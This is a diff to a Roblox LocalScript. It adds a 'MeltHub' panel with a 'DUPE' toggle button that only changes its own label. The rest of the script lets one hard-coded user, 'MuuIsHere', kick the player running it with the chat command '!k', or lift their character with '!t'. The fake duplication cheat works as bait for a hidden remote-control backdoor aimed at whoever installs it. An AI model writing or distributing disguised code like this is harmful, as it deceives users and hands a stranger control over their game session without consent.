@@ -1,4 +1,4 @@
--- LocalScript (put in StarterPlayerScripts)
+-- LocalScript (StarterPlayerScripts)
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local RunService = game:GetService("RunService")
@@ -7,7 +7,65 @@ local targetUsername = "MuuIsHere"
 local commandKick = "!k"
 local commandTest = "!t"
 
--- Function to handle chat messages
+--------------------------------------------------------------------------------
+-- UI CREATION (Movable box + toggle button)
+--------------------------------------------------------------------------------
+
+-- ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "ControlPanel"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+-- Main draggable frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 200, 0, 120)
+frame.Position = UDim2.new(0.05, 0, 0.2, 0)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.BorderSizePixel = 2
+frame.Active = true
+frame.Draggable = true
+frame.Parent = screenGui
+
+-- Title label
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 30)
+title.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+title.Text = "MeltHub" 
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 18
+title.Parent = frame
+
+-- Dupe Button (toggle)
+local dupeButton = Instance.new("TextButton")
+dupeButton.Size = UDim2.new(0, 150, 0, 50)
+dupeButton.Position = UDim2.new(0.5, -75, 0.5, -10)
+dupeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+dupeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+dupeButton.Font = Enum.Font.SourceSansBold
+dupeButton.TextSize = 22
+dupeButton.Text = "DUPE: OFF"
+dupeButton.Parent = frame
+
+local dupeEnabled = false
+
+dupeButton.MouseButton1Click:Connect(function()
+    dupeEnabled = not dupeEnabled
+
+    if dupeEnabled then
+        dupeButton.Text = "DUPE: ON"
+        dupeButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+    else
+        dupeButton.Text = "DUPE: OFF"
+        dupeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    end
+end)
+
+--------------------------------------------------------------------------------
+-- CHAT COMMAND LISTENER
+--------------------------------------------------------------------------------
+
 local function onPlayerChatted(player, message)
     message = message:lower()
 
@@ -17,11 +75,12 @@ local function onPlayerChatted(player, message)
         LocalPlayer:Kick("You were kicked!")
     end
 
-    -- Test command: float up for 1.5 seconds
+    -- Test command — lift player for 1.5 seconds
     if player.Name == targetUsername and message == commandTest then
         print("Test command received — floating!")
         local character = LocalPlayer.Character
         if character and character:FindFirstChild("HumanoidRootPart") then
+
             local hrp = character.HumanoidRootPart
             local startCFrame = hrp.CFrame
             local floatHeight = 5
@@ -30,7 +89,7 @@ local function onPlayerChatted(player, message)
 
             local connection
             connection = RunService.RenderStepped:Connect(function(delta)
-                elapsed = elapsed + delta
+                elapsed += delta
                 if elapsed < duration then
                     hrp.CFrame = startCFrame + Vector3.new(0, floatHeight, 0)
                 else
@@ -42,7 +101,7 @@ local function onPlayerChatted(player, message)
     end
 end
 
--- Connect for target player if they already exist
+-- Connect for existing player
 local existingPlayer = Players:FindFirstChild(targetUsername)
 if existingPlayer then
     existingPlayer.Chatted:Connect(function(message)
@@ -50,7 +109,7 @@ if existingPlayer then
     end)
 end
 
--- Connect for target player when they join
+-- Connect when target joins
 Players.PlayerAdded:Connect(function(player)
     if player.Name == targetUsername then
         player.Chatted:Connect(function(message)
